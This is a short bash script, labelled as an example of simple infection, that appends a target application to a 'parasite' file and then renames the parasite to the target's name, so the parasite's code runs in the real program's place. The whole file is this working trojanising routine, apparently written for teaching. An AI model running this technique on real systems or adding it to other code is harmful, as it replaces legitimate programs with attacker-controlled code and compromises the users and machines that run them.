#!/bin/bash
# 
# Example of simple infection
# usage:
#   ./infect.sh <target> <parassite>
#

# Append real application to end of parassite code
cat $1 >> $2
# Rename the parassite as the target application
mv $2 $1
